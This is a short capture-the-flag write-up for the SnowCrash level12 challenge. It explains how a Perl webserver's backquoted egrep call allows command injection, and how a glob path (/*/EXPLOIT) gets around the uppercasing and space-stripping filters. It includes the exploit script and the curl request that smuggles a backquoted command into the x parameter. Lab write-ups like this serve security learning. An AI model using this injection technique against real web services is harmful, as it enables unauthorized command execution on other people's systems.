On login we see a perl script that is running a webserver on the port 4646, that can take two get params, x and y.
We can clearly were we gonna do the exploit here, there is backquote.

```
	@output = `egrep "^$xx" /tmp/xd 2>&1`;
```

By looking on the code we can see 2 regex

```
	$xx =~ tr/a-z/A-Z/;
	$xx =~ s/\s.*//;
```

the first one convert every alpha characters to their uppercase equivalence,
the second one remove every space.
So we can't exploit by simply call `getflag > /tmp/toto`,
but we can use shell substitution * and create a uppercase file exploit, name /tmp/EXPLOIT, /*/EXPLOIT will match it.
(don't forget to change permissions)

```
	#!/bin/sh
	getflag | wall
```

and then simply use curl or do a ssh bridge to make a http call.

```
level12@SnowCrash:~$ curl localhost:4646?x='`/*/EXPLOIT`'
